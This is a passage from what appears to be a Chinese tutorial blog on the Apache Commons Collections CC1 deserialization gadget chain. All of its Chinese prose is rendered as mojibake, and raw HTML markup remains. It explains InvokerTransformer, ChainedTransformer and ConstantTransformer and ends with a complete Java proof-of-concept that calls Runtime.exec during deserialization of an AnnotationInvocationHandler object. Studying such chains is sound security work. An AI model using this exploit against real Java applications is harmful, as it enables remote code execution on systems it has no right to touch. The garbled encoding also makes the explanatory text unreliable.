<strong>åŠ¨æ€ä»£ç†è°ƒç”¨æˆå‘˜æ–¹æ³•æ—¶çš„è¡Œä¸º</strong>ã€‚</p></blockquote><p>ä¹Ÿå°±æ˜¯è¯´å®ƒç¼“å­˜äº†ï¼š</p><ul><li><strong>memberTypes</strong>ï¼šæˆå‘˜å â†’ â€œä»£ç†è°ƒç”¨æ—¶åº”è¯¥è¿”å›çš„ç±»å‹â€</li><li><strong>members</strong>ï¼šæˆå‘˜å â†’ åå°„ Methodï¼ˆä¸»è¦ç”¨äºæ‹¼å¼‚å¸¸ä¿¡æ¯ï¼‰</li><li><strong>memberDefaults</strong>ï¼šæˆå‘˜å â†’ é»˜è®¤å€¼</li></ul><p>å…¶ä¸­</p><p><strong>memberTypes</strong> </p><ul><li>keyï¼šæˆå‘˜åï¼ˆä¹Ÿå°±æ˜¯æ³¨è§£é‡Œé‚£äº›<strong>æ— å‚æ–¹æ³•</strong>çš„åå­—ï¼Œæ¯”å¦‚ <code>value()</code> çš„åå­—å°±æ˜¯ <code>&quot;value&quot;</code>ï¼‰</li><li>valueï¼šè¿™ä¸ªæˆå‘˜<strong>åº”è¯¥è¿”å›çš„ç±»å‹</strong></li></ul><p><code>Class&lt;?&gt; memberType = memberTypes.get(name);</code>é€šè¿‡æˆ‘ä»¬ä¼ é€’æ•°ç»„çš„ key æ¥ç¡®è®¤æ³¨è§£å­˜åœ¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;yy&quot;</span>);</span><br><span class="line">Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(chuan));</span><br><span class="line"><span class="comment">//        for(Map.Entry&lt;Object,Object&gt; entry : transformedMap.entrySet())&#123;</span></span><br><span class="line"><span class="comment">//            entry.setValue(r);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> constructor.newInstance(Target.class, transformedMap);</span><br></pre></td></tr></table></figure><p><strong>æˆ‘ä»¬ä¼ é€’ä¸€ä¸ª Target æ³¨è§£ï¼Œé›†åˆç¬¬ä¸€ä¸ªé”®å€¼å¯¹ key ä¸º value ,ä»–åœ¨ä¹‹åæˆä¸ºname</strong></p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601081313336.png" alt="image-20260108131322257"></p><p>è¿™é‡Œ <code>memberValue.setValue</code> çš„<strong>éœ€è¦è¢«æ§åˆ¶ä¸ºæˆ‘ä»¬çš„é“¾å¯¹è±¡</strong></p><p>è¿™é‡Œæˆ‘ä»¬ç”¨åˆ°äº†<code>ConstantTransformer</code>ç±»ï¼Œä½¿å…¶æ— è®ºå‚æ•°æ— è®ºæ˜¯å•¥ï¼Œéƒ½ä¸ç®¡ï¼Œç¬¬ä¸€å±‚è¿”å›çš„éƒ½æ˜¯<code>Runtime.class</code></p><ul><li><a href="#3ConstantTransformer%E7%B1%BB">3.ConstantTransformerç±»</a></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">r</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">chaun0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(r);</span><br></pre></td></tr></table></figure></li></ol><p><strong>æˆåŠŸæ‰“é€š</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601081340344.png" alt="image-20260108134003240"></p><h2 id="äºŒã€Transformeré‡è¦å®ç°ç±»"><a href="#äºŒã€Transformeré‡è¦å®ç°ç±»" class="headerlink" title="äºŒã€Transformeré‡è¦å®ç°ç±»"></a>äºŒã€Transformeré‡è¦å®ç°ç±»</h2><h3 id="1-InvokerTransformerç±»"><a href="#1-InvokerTransformerç±»" class="headerlink" title="1.InvokerTransformerç±»"></a>1.<code>InvokerTransformer</code>ç±»</h3><p><code>InvokerTransformer.java</code>è¿™ä¸ªç±»ä¸­çš„<code>transform</code>ç”¨æ¥å®ç°å±é™©æ–¹æ³•è°ƒç”¨</p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601072050766.png" alt="image-20260107205034657"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InvokerTransformer</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span>, Serializable &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//æ„é€ æ–¹æ³•</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        iMethodName = methodName;</span><br><span class="line">        iParamTypes = paramTypes;</span><br><span class="line">        iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//é‡å†™çš„transformæ–¹æ³•</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, iArgs);</span><br><span class="line">                </span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, ex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ–¹æ³•ä¸ºåˆ©ç”¨æ„é€ æ–¹æ³•æ§åˆ¶ï¼š</p><ul><li><code>iMethodName</code>ï¼šè¦è°ƒç”¨çš„æ–¹æ³•å</li><li><code>iParamTypes</code>ï¼šæ–¹æ³•å‚æ•°ç±»å‹æ•°ç»„ï¼Œç±»å‹ä¸º<code>Class[]</code></li><li><code>iArgs</code>ï¼šå®é™…å‚æ•°æ•°ç»„ï¼Œç±»å‹ä¸º<code>Object[]</code></li><li>ä»¥åŠ <code>input</code>ï¼štransform è¢«å–‚è¿›æ¥çš„å¯¹è±¡æ˜¯ä»€ä¹ˆ</li></ul><p>é‚£ä¹ˆ <code>transform(input)</code> å°±ä¸å†æ˜¯â€œå›ºå®šé€»è¾‘â€ï¼Œè€Œæ˜¯ï¼š</p><blockquote><p><strong>å¯¹ input è°ƒç”¨ä»»æ„æ–¹æ³•ï¼Œå¹¶ä¼ å…¥ä»»æ„å‚æ•°ï¼ˆç±»å‹è¦åŒ¹é…ï¼‰ã€‚</strong></p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">transformer.transform(runtime);</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601072115031.png" alt="image-20260107211505974"></p><p><strong>ä»¥æ­¤æˆ‘ä»¬å®ç°ä½¿ç”¨è¯¥ç±»è¿›è¡Œè°ƒç”¨ç³»ç»Ÿå‘½ä»¤ï¼Œä½†ä¾æ—§æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯<code>Runtime</code>ç±»æ˜¯æ— æ³•è¿›è¡Œåºåˆ—åŒ–ä¸ååºåˆ—åŒ–çš„ï¼Œæ•…å› æ­¤ï¼Œæˆ‘ä»¬ä¹Ÿåˆ©ç”¨è¯¥ç±»è·å–<code>Runtime</code>ç±»</strong></p><ul><li><p><code>Class</code>å¯¹è±¡æ˜¯å¯ä»¥è¿›è¡Œååºåˆ—åŒ–çš„ï¼Œå®ƒå®ç°äº†<code>Serializable</code>æ¥å£</p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601072119277.png" alt="image-20260107211954235"></p></li><li><p>æˆ‘ä»¬å¯ä»¥è·å–<code>Runtime.class</code>ç„¶åè°ƒç”¨<code>Runtime.class.getClass()</code>è·å–**â€œè¿™ä¸ªå¯¹è±¡â€çš„è¿è¡Œæ—¶ç±»å‹å¯¹åº”çš„ **<code>Class</code> <strong>å¯¹è±¡</strong>ï¼Œç„¶åï¼Œåˆ©ç”¨å®ƒè°ƒç”¨<code>getMethod</code>æ–¹æ³•ï¼Œç„¶ååˆ©ç”¨å…¶è·å–<code>Runtime</code>å¯¹è±¡ï¼Œä¹‹ååœ¨è¿æ¥åˆå§‹çš„é“¾ã€‚</p><p><strong>è¿™é‡Œä¸ºå•¥è·å–classçš„classåœ¨è·å–getMethod,è€Œä¸æ˜¯ç›´æ¥è·å–grtRuntimeæ–¹æ³•å‘¢ï¼Œæ˜¯å› ä¸ºè¿™ä¸ªæ¶æ„å‘½ä»¤åŠ è½½å½±å“ï¼Œä¼ è¿›æ¥çš„Classä¸€å®šä¼šç»è¿‡ä¸€æ¬¡getClassï¼Œæ‰€ä»¥å¯¼è‡´ä¸èƒ½ç›´æ¥è·å–Runtime.classä¸‹çš„getRuntimeæ–¹æ³•</strong></p><p><strong>æœ¬è´¨ä¸Šæ˜¯å› ä¸ºè¿™é‡Œç›´æ¥è·å–äº†æ–¹æ³•å¹¶invokeï¼Œæˆ‘ä»¬æƒ³è¦ä¼ Classå¯¹è±¡ï¼Œå°±åªèƒ½ç”¨getMethodä¸­è½¬ä¸€ä¸‹ï¼Œç¬¬äºŒä¸ªè·å–invokeæ–¹æ³•åŒç†ï¼</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601072243737.png" alt="image-20260107224310604"></p></li></ul><p><strong>æ‰€ä»¥æœ€ç»ˆ</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">transformer1</span> <span class="operator">=</span> (Method) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;).transform(Runtime.class);</span><br><span class="line"></span><br><span class="line"><span class="type">Runtime</span> <span class="variable">transformer2</span> <span class="operator">=</span> (Runtime) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;).transform(transformer1);</span><br><span class="line"></span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformer3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(transformer2);</span><br></pre></td></tr></table></figure><p><strong>éœ€è¦æ³¨æ„</strong></p><p><code>Method.invoke(Object obj, Object... args)</code> çš„ç¬¬äºŒä¸ªå‚æ•°</p><p>ç›´æ¥è°ƒç”¨ç›®æ ‡æ–¹æ³•æ—¶ï¼šå¯ä»¥ä¸å†™</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Method m = Runtime.class.getMethod(&quot;getRuntime&quot;);</span><br><span class="line">Object rt = m.invoke(null);     // static + æ— å‚ï¼šargs çœç•¥</span><br></pre></td></tr></table></figure><p>ä½†å¦‚æœä½ æ˜¯â€œé€šè¿‡åå°„å»è°ƒç”¨ invoke æœ¬èº«â€ï¼šç¬¬äºŒä¸ªå‚æ•°ä¸èƒ½ä¸å†™</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">INVOKE</span> <span class="operator">=</span> Method.class.getMethod(<span class="string">&quot;invoke&quot;</span>, Object.class, Object[].class);</span><br><span class="line"></span><br><span class="line"><span class="comment">// è°ƒç”¨ invoke è¿™ä¸ªæ–¹æ³•æ—¶ï¼Œå®ƒçš„å½¢å‚æ˜¯ä¸¤ä¸ªï¼šobj + Object[]</span></span><br><span class="line"><span class="comment">// æ‰€ä»¥ä½ å¾—ç»™å®ƒä¸¤ä¸ªå®å‚ï¼šobj + argsæ•°ç»„ï¼ˆæ— å‚å°±ä¼ ç©ºæ•°ç»„ï¼‰</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">ret</span> <span class="operator">=</span> INVOKE.invoke(æŸä¸ªMethodå¯¹è±¡, <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure><h3 id="2-ChainedTransformerç±»"><a href="#2-ChainedTransformerç±»" class="headerlink" title="2.ChainedTransformerç±»"></a>2.ChainedTransformerç±»</h3><p><code>org/apache/commons/collections/functors/ChainedTransformer.java</code>è¿™ä¸ªç±»æˆ‘ä»¬ç”¨æ¥ä¼˜åŒ–ä¸Šé¢é‡å¤çš„ä»£ç ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601080859243.png" alt="image-20260108085935171"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public Object transform(Object object) &#123;</span><br></pre></td></tr></table></figure><ul><li><p>è¿™æ˜¯ä¸€ä¸ªå®ä¾‹æ–¹æ³•ï¼Œåå­—ä¹Ÿå« <code>transform</code></p><p>å…¥å‚å’Œè¿”å›å€¼éƒ½æ˜¯ <code>Object</code>ï¼šè¯´æ˜å®ƒ<strong>ä¸é™å®šå…·ä½“ç±»å‹</strong>ï¼Œå•¥éƒ½èƒ½ä¼ &#x2F;è¿”å›</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for (int i = 0; i &lt; iTransformers.length; i++) &#123;</span><br></pre></td></tr></table></figure><ul><li><p><code>iTransformers</code> æ˜¯ä¸€ä¸ªæ•°ç»„ï¼ˆ<code>Transformer[]</code>ï¼‰</p><p>è¿™æ®µå¾ªç¯å°±æ˜¯ï¼šä»ç¬¬ 0 ä¸ª transformer ä¸€ç›´è·‘åˆ°æœ€åä¸€ä¸ª</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">object = iTransformers[i].transform(object);</span><br></pre></td></tr></table></figure><ul><li><p>æ ¸å¿ƒï¼š<strong>è°ƒç”¨ç¬¬ i ä¸ª transformer çš„ transform æ–¹æ³•</strong></p><p>æŠŠå½“å‰ <code>object</code> ä¸¢è¿›å»ï¼Œå¾—åˆ°ä¸€ä¸ªæ–°å¯¹è±¡</p><p>å†æŠŠè¿™ä¸ªæ–°å¯¹è±¡èµ‹å€¼å› <code>object</code> â€”â€”<br> <strong>â€œè¦†ç›–â€æ„å‘³ç€ä½ åªä¿ç•™æœ€æ–°çš„ç»“æœ</strong>ï¼Œä¸­é—´ç»“æœä¸å†ä¿ç•™</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">    &#125;</span><br><span class="line">    return object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>å¾ªç¯ç»“æŸæ—¶ï¼Œ<code>object</code> å·²ç»æ˜¯æœ€åä¸€ä¸ª transformer å¤„ç†åçš„ç»“æœ</li></ul><p><strong>ä¼˜åŒ–é“¾</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">r</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">chuan1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;);</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">chuan2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;);</span><br><span class="line">Transformer chuan3= <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">Transformer[] chuan = &#123;chuan1,chuan2,chuan3&#125;;</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(chuan).transform(r);</span><br></pre></td></tr></table></figure><p><strong>è¿™æ ·ï¼Œæˆ‘ä»¬å°±å®ç°äº†ï¼Œåªéœ€è¦ä¼ é€’ä¸€ä¸ª<code>Transformer</code>æ•°ç»„åˆ°ChainTransformerå¯¹è±¡ç„¶åå¯»æ‰¾é“¾è°ƒç”¨transformå³å¯</strong></p><h3 id="3-ConstantTransformerç±»"><a href="#3-ConstantTransformerç±»" class="headerlink" title="3.ConstantTransformerç±»"></a>3.ConstantTransformerç±»</h3><p><code>org/apache/commons/collections/functors/ConstantTransformer.java</code>è¿™ä¸ªç±»æˆ‘ä»¬æŠŠå®ƒå½“ä½œ<strong>å¸¸é‡ç±»</strong></p><p>ä»–çš„<code>transform</code>æ–¹æ³•æ˜¯è¿”å›ä¸€ä¸ªå¸¸é‡ç±»ï¼Œè€Œä¸”è¿™ä¸ªç±»å¯æ§</p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601081335796.png" alt="image-20260108133522732"></p><p>è¿™ä¸ªæ–¹æ³•æ— è®ºï¼Œä¼ å…¥çš„å‚æ•°æ˜¯ä»€ä¹ˆï¼Œè¿”å›çš„éƒ½æ˜¯å®ƒè‡ªå·±çš„ä¸€ä¸ªå±æ€§<code>iConstant</code></p><p>è€Œè¿™ä¸ª<code>input</code>å¯æ§ï¼Œé€šè¿‡æ„é€ æ–¹æ³•å°±å¯ä»¥å®ç°</p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601081336207.png" alt="image-20260108133633132"></p><p>æ‰€ä»¥æˆ‘ä»¬æ„é€ ä¸€ä¸ªç±»ï¼Œè®©ä»–è°ƒç”¨<code>transform</code>æ–¹æ³•æ—¶æ— è®ºå‚æ•°æ˜¯å•¥éƒ½è¿”å›<code>Runtime</code>ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">r</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">chaun0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(r);</span><br></pre></td></tr></table></figure><h2 id="ä¸‰ã€å›é¡¾"><a href="#ä¸‰ã€å›é¡¾" class="headerlink" title="ä¸‰ã€å›é¡¾"></a>ä¸‰ã€å›é¡¾</h2><p>æœ€ç»ˆçš„æ¼æ´ poc å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">        <span class="type">Class</span> <span class="variable">r</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chaun0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(r);</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chuan1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;);</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chuan2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;);</span><br><span class="line">        Transformer chuan3= <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        Transformer[] chuan = &#123;chaun0,chuan1,chuan2,chuan3&#125;;</span><br><span class="line"><span class="comment">//        new ChainedTransformer(chuan).transform(r);</span></span><br><span class="line">        Map&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;yy&quot;</span>);</span><br><span class="line">        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(chuan));</span><br><span class="line"><span class="comment">//        for(Map.Entry&lt;Object,Object&gt; entry : transformedMap.entrySet())&#123;</span></span><br><span class="line"><span class="comment">//            entry.setValue(r);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> constructor.newInstance(Target.class, transformedMap);</span><br><span class="line"><span class="comment">//        serialize(obj);</span></span><br><span class="line">        unserialize();</span><br></pre></td></tr></table></figure><p><strong>å¤§æ¦‚çš„é“¾è·¯è°ƒç”¨é€»è¾‘</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">InvokerTransformer-transform()</span><br><span class="line"><span class="meta prompt_">-&gt;</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">TransformedMap-checkSetValue()</span></span><br><span class="line"><span class="meta prompt_">-&gt;</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">AbstractInputCheckedMapDecorator-setValue()</span></span><br><span class="line"><span class="meta prompt_">-&gt;</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">AnnotationInvocationHandler-readObject()</span></span><br><span class="line"></span><br><span class="line">è¾…åŠ©</span><br><span class="line">ChainedTransformer-transform()</span><br><span class="line">HashMap</span><br><span class="line">ConstantTransformer-transform()</span><br></pre></td></tr></table></figure><h2 id="å››ã€Commons-CollectionåŒ…"><a href="#å››ã€Commons-CollectionåŒ…" class="headerlink" title="å››ã€Commons CollectionåŒ…"></a>å››ã€Commons CollectionåŒ…</h2><p><strong>å®ƒæ˜¯ JDK è‡ªå¸¦ <code>java.util.\*</code> çš„â€œå¢å¼ºåŒ…â€</strong>ï¼Œè¡¥äº†ä¸€å †æ›´å¥½ç”¨çš„æ•°æ®ç»“æ„ã€è£…é¥°å™¨ï¼ˆdecoratorï¼‰ã€ä»¥åŠâ€œå‡½æ•°å¼å›è°ƒâ€ï¼ˆTransformer&#x2F;Predicate&#x2F;Closure&#x2F;Factoryï¼‰å·¥å…·ã€‚å®˜æ–¹å®šä½å°±æ˜¯â€œåŸºäºå¹¶å— JDK é›†åˆæ¡†æ¶å¯å‘çš„ä¸€å¥—é›†åˆç±»åº“â€ã€‚</p><h3 id="1-æ ¸å¿ƒ"><a href="#1-æ ¸å¿ƒ" class="headerlink" title="1.æ ¸å¿ƒ"></a>1.æ ¸å¿ƒ</h3><p>æ ¹åŒ…é€šå¸¸æ”¾çš„æ˜¯ <strong>æ¥å£ + 